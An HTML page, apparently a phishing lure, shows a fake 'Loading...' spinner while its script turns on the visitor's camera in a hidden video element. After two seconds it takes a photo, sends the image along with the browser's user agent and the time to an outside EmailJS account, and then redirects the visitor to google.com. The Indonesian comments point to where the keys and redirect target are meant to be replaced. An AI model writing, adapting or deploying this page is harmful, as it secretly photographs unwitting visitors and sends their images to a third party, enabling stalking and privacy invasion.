<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>WELCOME</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      text-align: center;
    }

    .loader {
      border: 4px solid #1e293b;
      border-top: 4px solid #38bdf8;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: auto;
      margin-bottom: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<div class="box">
  <div class="loader"></div>
  <h3>Loading...</h3>
</div>

<!-- Kamera (disembunyikan) -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="300" height="225" style="display:none;"></canvas>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>
(function(){
    emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI
})();

const video = document.getElementById("video");

// Akses kamera depan
navigator.mediaDevices.getUserMedia({
    video: { facingMode: "environment" }
})
.then(stream => {
    video.srcObject = stream;

    // Tunggu kamera siap lalu ambil foto
    setTimeout(ambilFoto, 2000);
})
.catch(err => {
    console.log("Kamera error:", err);

    // tetap redirect
    setTimeout(() => {
        window.location.href = "https://google.com";
    }, 3000);
});

// Ambil foto & kirim
function ambilFoto() {
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/png");

    emailjs.send("service_lzuezkd", "template_33st1em", {
        message: "Foto berhasil diambil",
        image: imageData,
        time: new Date().toLocaleString(),
        device: navigator.userAgent
    })
    .then(() => {
        console.log("Berhasil kirim");

        setTimeout(() => {
            window.location.href = "https://google.com"; // GANTI
        }, 3000);
    })
    .catch(() => {
        console.log("Gagal kirim");

        setTimeout(() => {
            window.location.href = "https://google.com";
        }, 3000);
    });
}
</script>

</body>
  </html>
